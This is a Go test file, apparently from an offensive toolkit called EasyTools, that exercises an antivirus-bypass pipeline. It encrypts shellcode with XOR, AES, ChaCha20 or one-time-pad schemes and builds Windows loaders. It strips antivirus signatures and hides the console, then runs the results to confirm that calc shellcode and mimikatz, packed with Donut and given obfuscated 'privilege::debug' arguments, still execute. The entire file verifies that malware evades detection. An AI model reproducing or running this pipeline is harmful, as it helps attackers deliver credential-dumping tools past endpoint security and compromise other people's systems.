package bypassAv

import (
	"EasyTools/app/bypass/donut"
	"EasyTools/app/bypass/shell/encode"
	"EasyTools/app/bypass/shell/util"
	"bufio"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

func findRepoRoot(t *testing.T) string {
	t.Helper()
	dir, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 8; i++ {
		if _, err := os.Stat(filepath.Join(dir, "jsq.bin")); err == nil {
			return dir
		}
		dir = filepath.Dir(dir)
	}
	t.Fatal("未找到仓库根目录（缺少 jsq.bin）")
	return ""
}

func e2ePrep(t *testing.T, payload []byte) string {
	t.Helper()
	dir := filepath.Join(os.TempDir(), "EasyTools", "file")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := util.InitGoModule(); err != nil {
		t.Fatalf("初始化 Go 模块失败: %v", err)
	}
	xorKey, _ := encode.GenerateXorKey()
	aesKey := encode.GenerateAesKey()
	aesEnc, _ := encode.Aes_Encrypt(payload, aesKey)
	chachaKey, _ := encode.GenerateChaCha20Key()
	chachaNonce, _ := encode.GenerateChaCha20Nonce()
	chachaEnc, _ := encode.ChaCha20Encrypt(chachaKey, chachaNonce, payload)

	os.WriteFile(filepath.Join(dir, "payload.bin"), payload, 0644)
	os.WriteFile(filepath.Join(dir, "AesEncrypted.txt"), aesEnc, 0644)
	os.WriteFile(filepath.Join(dir, "AesKey.txt"), aesKey, 0644)
	// 注意：XorEncrypt/ChaCha20Encrypt 等编码函数会原地修改传入切片。
	// 这里必须传 payload 副本，否则后续 OtpEncrypt(payload) 会加密"Xor 密文"而非明文，
	// 导致 OTP 载荷解出来是二次密文、运行即崩（历史教训，勿删 append 副本）。
	os.WriteFile(filepath.Join(dir, "XorEncrypted.txt"), encode.XorEncrypt(append([]byte(nil), payload...), xorKey), 0644)
	os.WriteFile(filepath.Join(dir, "XorKey.txt"), encode.XorKeyToBytes(xorKey), 0644)
	os.WriteFile(filepath.Join(dir, "ChaCha20Encrypted.txt"), chachaEnc, 0644)
	os.WriteFile(filepath.Join(dir, "ChaCha20Key.txt"), chachaKey, 0644)
	os.WriteFile(filepath.Join(dir, "ChaCha20Nonce.txt"), chachaNonce, 0644)
	otpBlob, _ := encode.OtpEncrypt(payload)
	os.WriteFile(filepath.Join(dir, "OtpEncrypted.txt"), otpBlob, 0644)
	os.WriteFile(filepath.Join(dir, "UrlOrFileEncrypted.txt"), []byte("deadbeef"), 0644)
	os.WriteFile(filepath.Join(dir, "UrlXorKey.txt"), []byte{0x42}, 0644)
	return dir
}

// e2eBuild mode: none|console|scrub|full —— 定位后处理哪个环节破坏产物
func e2eBuild(t *testing.T, dir, loader, passBox, mode string) string {
	t.Helper()
	return e2eBuildEnc(t, dir, loader, passBox, mode, "xor")
}

// e2eBuildEnc 同 e2eBuild，但可指定编码方式（xor/aes/chacha20/otp）
func e2eBuildEnc(t *testing.T, dir, loader, passBox, mode, encodeWay string) string {
	t.Helper()
	out, gerr := util.GenGoFile(loader, "一体", encodeWay, passBox, "false", "false", "", "false", "", "", nil, nil)
	if gerr != nil || out == "" {
		t.Fatalf("GenGoFile(%s, encode=%s) 失败: %v", loader, encodeWay, gerr)
	}
	bin := filepath.Join(dir, fmt.Sprintf("e2e_%s_%s_%s.exe", loader, mode, encodeWay))
	cmd := exec.Command("go", "build", "-o", bin, out)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	if b, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("编译失败: %v\n%s", err, b)
	}
	// full / keepconsole 走真实 PostProcessBuiltBinary 全链（含随机版本信息写入），
	// console / scrub 保留手动步骤用于二分定位
	if mode == "full" {
		util.PostProcessBuiltBinary(bin, "windows", false)
	} else if mode == "keepconsole" {
		util.PostProcessBuiltBinary(bin, "windows", true)
	} else {
		if mode == "console" {
			util.CloseWindowsConsole(bin)
		}
		if mode == "scrub" {
			if _, err := util.ScanAndEvadeAVSignatures(bin); err != nil {
				t.Fatalf("特征清理失败: %v", err)
			}
		}
	}
	return bin
}

// readPESubsystem 返回 PE OptionalHeader 的 Subsystem（2=GUI 3=Console）
func readPESubsystem(path string) (uint16, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0, err
	}
	peOff := int(data[0x3C])
	opt := peOff + 24
	magic := uint16(data[opt]) | uint16(data[opt+1])<<8
	subOff := opt
	if magic == 0x20b {
		subOff += 68 // PE32+ Subsystem
	} else if magic == 0x10b {
		subOff += 68
	} else {
		return 0, fmt.Errorf("unknown optional magic")
	}
	return uint16(data[subOff]) | uint16(data[subOff+1])<<8, nil
}

// processSnapshot 返回 pid -> 进程名 映射（tasklist CSV）
func processSnapshot() map[string]string {
	out, err := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
	if err != nil {
		return map[string]string{}
	}
	m := map[string]string{}
	sc := bufio.NewScanner(bytes.NewReader(out))
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if !strings.HasPrefix(line, `"`) {
			continue
		}
		parts := strings.Split(line, `","`)
		if len(parts) < 2 {
			continue
		}
		name := strings.Trim(parts[0], `"`)
		pid := strings.Trim(parts[1], `"`)
		if name != "" && pid != "" {
			m[pid] = name
		}
	}
	return m
}

// observeRun 启动 loader，在 window 秒内轮询新增进程并记录退出状态
func observeRun(bin string, window time.Duration) (report string, newProcs []string, exited bool, exitCode int) {
	before := processSnapshot()
	proc := exec.Command(bin)
	if err := proc.Start(); err != nil {
		return fmt.Sprintf("启动失败: %v", err), nil, true, -999
	}
	deadline := time.Now().Add(window)
	seen := map[string]string{}
	for time.Now().Before(deadline) {
		if proc.ProcessState != nil && proc.ProcessState.Exited() {
			break
		}
		after := processSnapshot()
		for pid, name := range after {
			if _, ok := before[pid]; !ok {
				if _, dup := seen[pid]; !dup && pid != fmt.Sprint(proc.Process.Pid) {
					seen[pid] = name
					newProcs = append(newProcs, name)
				}
			}
		}
		time.Sleep(400 * time.Millisecond)
	}
	exited = proc.ProcessState != nil && proc.ProcessState.Exited()
	exitCode = -1
	if exited {
		exitCode = proc.ProcessState.ExitCode()
	} else {
		_ = proc.Process.Kill()
	}
	report = fmt.Sprintf("loader退出=%v code=%d 新增进程=%v", exited, exitCode, seen)
	return report, newProcs, exited, exitCode
}

func TestPipelineE2E_RealPayloads(t *testing.T) {
	if testing.Short() || runtime.GOOS != "windows" {
		t.Skip("仅 Windows 长测")
	}
	root := findRepoRoot(t)
	payloadName := "jsq.bin"

	t.Run("jsq_calc_postprocess_bisect", func(t *testing.T) {
		payload, err := os.ReadFile(filepath.Join(root, payloadName))
		if err != nil {
			t.Skipf("缺少 %s", payloadName)
		}
		dir := e2ePrep(t, payload)
		for _, mode := range []string{"none", "console", "scrub", "full"} {
			bin := e2eBuild(t, dir, "loader1", "否", mode)
			report, newProcs, _, _ := observeRun(bin, 7*time.Second)
			spawned := false
			for _, n := range newProcs {
				if strings.Contains(strings.ToLower(n), "calc") {
					spawned = true
				}
			}
			t.Logf("[mode=%s] calc出现=%v %s", mode, spawned, report)
		}
	})

	// OTP 一次一密：密文‖全长随机密钥 在翻 RX 前就地解码（loader1 拷贝行族），
	// 全后处理链（console/scrub/PE元数据）后 calc 仍应能拉起，验证解码语义未被破坏。
	t.Run("jsq_calc_otp_inplace", func(t *testing.T) {
		payload, err := os.ReadFile(filepath.Join(root, payloadName))
		if err != nil {
			t.Skipf("缺少 %s", payloadName)
		}
		dir := e2ePrep(t, payload)
		for _, mode := range []string{"full", "keepconsole"} {
			// 清理残留 calc 进程，避免 observeRun 的前后快照受上一个子测试产物干扰
			exec.Command("taskkill", "/F", "/IM", "calc.exe").Run()
			exec.Command("taskkill", "/F", "/IM", "CalculatorApp.exe").Run()
			time.Sleep(500 * time.Millisecond)
			bin := e2eBuildEnc(t, dir, "loader1", "否", mode, "otp")
			report, newProcs, _, _ := observeRun(bin, 8*time.Second)
			spawned := false
			for _, n := range newProcs {
				if strings.Contains(strings.ToLower(n), "calc") {
					spawned = true
				}
			}
			t.Logf("[otp mode=%s] calc出现=%v %s", mode, spawned, report)
			if !spawned {
				t.Errorf("OTP[%s] loader1 calc 未拉起（就地解码/后处理链异常）: %s", mode, report)
			}
		}
	})

	t.Run("mimikatz_donut_with_postprocess", func(t *testing.T) {
		exeBytes, err := os.ReadFile(filepath.Join(root, "mimikatz.exe"))
		if err != nil {
			t.Skipf("缺少 mimikatz.exe: %v", err)
		}
		pic, convErr := godonut.BuildPIC(exeBytes, "", "x64")
		if convErr != nil {
			t.Fatalf("Donut 转换失败: %v", convErr)
		}
		t.Logf("Donut 转换后 shellcode=%d 字节", len(pic))
		dir := e2ePrep(t, pic)
		bin := e2eBuild(t, dir, "loader1", "否", "full")
		report, newProcs, exited, code := observeRun(bin, 6*time.Second)
		t.Logf("mimikatz loader: %s", report)
		// 说明性输出：mimikatz 无参运行时本身可能长时间驻留/挂起，不强断言
		if exited && code != 0 && code != 1 {
			t.Logf("mimikatz loader 退出码非0（code=%d），疑似载荷崩溃", code)
		}
		_ = newProcs
	})

	// 保留控制台 + 预置参数：mimikatz 输出应可捕获（命令行工具使用场景）
	t.Run("mimikatz_keepconsole_output", func(t *testing.T) {
		exeBytes, err := os.ReadFile(filepath.Join(root, "mimikatz.exe"))
		if err != nil {
			t.Skipf("缺少 mimikatz.exe: %v", err)
		}
		// 与 upload 相同：参数大小写混淆 + 未压缩 Donut（压缩版在本加载链会崩溃，已弃用）
		params := obfuscateDonutParams(`"privilege::debug" "exit"`)
		pic, convErr := godonut.BuildPIC(exeBytes, params, "x64")
		if convErr != nil {
			t.Fatalf("Donut(带参数) 失败: %v", convErr)
		}
		dir := e2ePrep(t, pic)
		bin := e2eBuild(t, dir, "loader4", "否", "keepconsole")
		sub, err := readPESubsystem(bin)
		if err != nil {
			t.Fatal(err)
		}
		if sub != 3 {
			t.Fatalf("keepConsole 产物 Subsystem=%d（应为3=Console）", sub)
		}

		outFile := filepath.Join(dir, "mimikatz_out.txt")
		of, _ := os.Create(outFile)
		proc := exec.Command(bin)
		proc.Stdout = of
		proc.Stderr = of
		runErr := proc.Run()
		of.Close()
		outData, _ := os.ReadFile(outFile)
		t.Logf("keepConsole mimikatz: exit=%v code=%d 输出长度=%d", runErr, proc.ProcessState.ExitCode(), len(outData))
		if runErr != nil {
			t.Fatalf("keepConsole mimikatz 运行失败: %v", runErr)
		}
		if len(bytes.TrimSpace(outData)) == 0 {
			t.Errorf("keepConsole mimikatz 无任何输出（参数未生效或载荷未执行）")
		} else {
			s := string(outData)
			if len(s) > 300 {
				s = s[len(s)-300:]
			}
			if !bytes.Contains(bytes.ToLower(outData), []byte("privilege")) {
				t.Errorf("keepConsole mimikatz 输出中未见参数执行痕迹(privilege)，参数未载入: %q", s)
			} else {
				t.Logf("参数已生效：输出含 privilege 痕迹，尾部=%q", s)
			}
		}
	})

	// OTP 一次一密 + 保留控制台：mimikatz 大载荷（Donut PIC）经就地解码后
	// 应能正常输出，验证就地解码对真实大载荷的语义正确性（calc 类小载荷在
	// CI/沙箱环境行为不稳，改用可观测 stdout 的 mimikatz 链路）。
	t.Run("mimikatz_keepconsole_otp", func(t *testing.T) {
		exeBytes, err := os.ReadFile(filepath.Join(root, "mimikatz.exe"))
		if err != nil {
			t.Skipf("缺少 mimikatz.exe: %v", err)
		}
		params := obfuscateDonutParams(`"privilege::debug" "exit"`)
		pic, convErr := godonut.BuildPIC(exeBytes, params, "x64")
		if convErr != nil {
			t.Fatalf("Donut(带参数) 失败: %v", convErr)
		}
		dir := e2ePrep(t, pic)
		bin := e2eBuildEnc(t, dir, "loader4", "否", "keepconsole", "otp")
		outFile := filepath.Join(dir, "mimikatz_otp_out.txt")
		of, _ := os.Create(outFile)
		proc := exec.Command(bin)
		proc.Stdout = of
		proc.Stderr = of
		runErr := proc.Run()
		of.Close()
		outData, _ := os.ReadFile(outFile)
		t.Logf("keepConsole OTP mimikatz: exit=%v code=%d 输出长度=%d", runErr, proc.ProcessState.ExitCode(), len(outData))
		if runErr != nil {
			t.Fatalf("keepConsole OTP mimikatz 运行失败: %v", runErr)
		}
		if len(bytes.TrimSpace(outData)) == 0 {
			t.Errorf("keepConsole OTP mimikatz 无任何输出（OTP 就地解码后载荷未执行）")
		} else {
			s := string(outData)
			if len(s) > 300 {
				s = s[len(s)-300:]
			}
			if !bytes.Contains(bytes.ToLower(outData), []byte("privilege")) {
				t.Errorf("keepConsole OTP mimikatz 输出中未见参数执行痕迹(privilege): %q", s)
			} else {
				t.Logf("OTP 参数已生效：输出含 privilege 痕迹，尾部=%q", s)
			}
		}
	})
}
